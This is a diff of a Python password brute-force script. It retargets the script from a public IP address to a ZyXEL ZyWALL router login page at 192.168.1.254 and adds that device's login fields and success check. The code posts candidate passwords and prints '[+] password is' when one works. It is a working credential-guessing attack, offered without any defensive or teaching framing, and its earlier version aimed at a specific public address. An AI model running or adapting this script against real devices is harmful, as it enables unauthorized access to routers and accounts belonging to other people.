@@ -4,27 +4,32 @@ import random
 import string
 import json
 
-target_url = 'http://83.160.88.114:8080'
+target_url = 'http://192.168.1.254/login.cgi'
 target_username = 'user'
-if_contains_then_invalid = ['not permission', 'is_invalid']
+if_contains_then_valid = ['<script>window.location="indexMain.cgi"</script>']
+if_contains_then_invalid = []
 
 def post_it(password):
 
-    password = password.lower()
-    
+    # password = password.lower()
     # password = string.ascii_letters + string.digits
     # password = (os.urandom(1024))
     # password = password.join(random.choice(string.digits)) // Salt
     # password = password.join(random.choice(chars) for i in range(8))
 
     response = requests.post(target_url, allow_redirects=False, data={
-    	'username': target_username, # 'username-element-name': 'entered-target-username'
-    	'password': password, # 'password-element-name': 'password-from-json'
-        'Submit': "submit"
+    	'UserName': "user",
+        'loginPassword': "ZyXEL ZyWALL Series",
+        'submitValue': "1",
+    	'hiddenPassword': password,
+        'Submit': "Login"
     })
     
     print('testing password '+password+' on '+target_username)
-    if any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid):
+    contains_valid = any(if_contain_then_valid in str(response.content) for if_contain_then_valid in if_contains_then_valid)
+    contains_invalid = any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid)
+    
+    if contains_valid and not contains_invalid:
         print("[+] {}s password is {}".format(target_username, password))
         exit(0)
 
